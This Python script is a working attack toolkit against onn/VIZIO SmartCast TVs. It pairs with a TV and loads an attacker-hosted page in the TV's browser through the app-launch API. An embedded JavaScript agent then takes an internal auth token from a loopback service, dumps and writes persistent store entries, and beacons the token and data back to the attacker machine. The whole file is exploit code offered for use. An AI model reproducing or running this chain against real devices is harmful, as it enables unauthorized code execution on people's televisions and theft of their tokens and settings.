#!/usr/bin/env python3
"""
onn W4K65M-1030 / VIZIO SmartCast — LAN code-execution toolkit (verified chain)
1. Launch attacker URL in TV's Chromium via NAME_SPACE=4 APP_ID=3001
2. TV-side agent (served by --serve) reads loopback APIs, dumps store, writes keys
3. Proven primitives: JS exec, internal 7346 tokenless token, store RW (persistent)
"""
import os
import http.server, threading, subprocess, json, sys, time, urllib.request, ssl, functools

TV = os.environ.get("TV_IP", "192.168.0.116")   # your TV's LAN IP
PAIR_TOKEN = os.environ.get("PAIR_TOKEN", "")   # from the pairing flow (see README)
MY_IP = os.environ.get("MY_IP", "192.168.0.69") # attacker machine LAN IP
PORT = int(os.environ.get("PORT", "8099"))

AGENT = """<html><body><h1>PWN</h1><script>
(async () => {
  const B = (t,d) => fetch("http://__MYIP__:8099/hit?t=" + t + "&d=" + encodeURIComponent(String(d).slice(0,2700))).catch(()=>{});
  await B("js", "exec-ok");
  const S = "http://127.0.0.1:7346";
  const tok = (await (await fetch(S + "/app/get_auth_token")).json()).ITEM.VALUE;
  await B("token", tok);
  const api = async (p, m, body) => (await fetch(S+p, {method:m||"GET", headers:{"Content-Type":"application/json","AUTH":tok}, body})).text();
  if (__DUMP__) await B("store.all", await api("/app/store/get","PUT",JSON.stringify({VALUE:__KEYS__})));
  if (__WRITE__) {
    await B("write", await api("/app/store/set","PUT",JSON.stringify({VALUE:__WRITE__})));
    await B("verify", await api("/app/store/get","PUT",JSON.stringify({VALUE:Object.keys(__WRITE__)})));
  }
  await B("done","ok");
})();
</script></body></html>"""

def serve(wwwdir, seconds):
    logs = []
    class H(http.server.SimpleHTTPRequestHandler):
        def log_message(self, fmt, *args):
            line = fmt % args
            logs.append(line)
            if "/hit" in line:  # beacon from the TV-side agent
                try:
                    q = line.split("GET /hit")[1].split(" HTTP")[0]
                    import urllib.parse as up
                    print("[TV]", up.unquote(q)[:400])
                except Exception:
                    print("[srv]", line[:200])
    handler = functools.partial(H, directory=wwwdir)
    httpd = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True); t.start()
    return httpd

def pair(device_name="pwn-tool", device_id="pwn-tool-0001", pin=None):
    """Run the documented pairing flow; returns AUTH token. Prompts for the
    on-screen PIN unless given. Pairing is the normal SmartCast API flow."""
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    def put(path, body):
        req = urllib.request.Request(f"https://{TV}:7345{path}", data=json.dumps(body).encode(),
            method="PUT", headers={"Content-Type":"application/json"})
        return json.loads(urllib.request.urlopen(req, context=ctx, timeout=10).read())
    r = put("/pairing/start", {"DEVICE_NAME":device_name,"DEVICE_ID":device_id})
    tok = r["ITEM"]["PAIRING_REQ_TOKEN"]
    pin = pin or input(f"PIN shown on TV ({r['ITEM'].get('KEY','')}): ").strip()
    r = put("/pairing/pair", {"DEVICE_NAME":device_name,"DEVICE_ID":device_id,
                              "CHALLENGE_TYPE":1,"RESPONSE_VALUE":pin,"PAIRING_REQ_TOKEN":tok})
    return r["ITEM"]["AUTH_TOKEN"]

def launch(url):
    body = json.dumps({"VALUE":{"MESSAGE":url,"NAME_SPACE":4,"APP_ID":"3001"}}).encode()
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    req = urllib.request.Request(f"https://{TV}:7345/app/launch", data=body, method="PUT",
        headers={"AUTH":PAIR_TOKEN,"Content-Type":"application/json"})
    print("launch:", urllib.request.urlopen(req, context=ctx, timeout=10).read().decode()[:80])

def restore_home():
    body = json.dumps({"VALUE":{"MESSAGE":'{"app":"home","bundle":"bundles/home"}',"NAME_SPACE":4,"APP_ID":"1"}}).encode()
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    req = urllib.request.Request(f"https://{TV}:7345/app/launch", data=body, method="PUT",
        headers={"AUTH":PAIR_TOKEN,"Content-Type":"application/json"})
    urllib.request.urlopen(req, context=ctx, timeout=10).read()

if __name__ == "__main__":
    import tempfile, re
    if not PAIR_TOKEN:
        if "--pair" in sys.argv:
            PAIR_TOKEN = pair()
            print("paired; token:", PAIR_TOKEN, "(export PAIR_TOKEN=... to reuse)")
        else:
            sys.exit("set PAIR_TOKEN=<token> env or run with --pair to pair interactively")
    keys = ["ToadName","OMPFinalProof","ApplicationFramework:ChromiumSettings:DebugEnabled"]
    write = {"OMPPwnMarker2": str(int(time.time()))}
    d = tempfile.mkdtemp(prefix="tvwww")
    agent = AGENT.replace("__MYIP__", MY_IP).replace("__DUMP__","true").replace("__KEYS__",json.dumps(keys)).replace("__WRITE__",json.dumps(write))
    open(os.path.join(d,"a.html"),"w").write(agent)
    httpd = serve(d, 60)
    launch(f"http://{MY_IP}:{PORT}/a.html?v={int(time.time())}")
    print("agent running on TV; beacons:")
    end = time.time()+25
    while time.time() < end:
        time.sleep(1)
    restore_home(); httpd.shutdown()
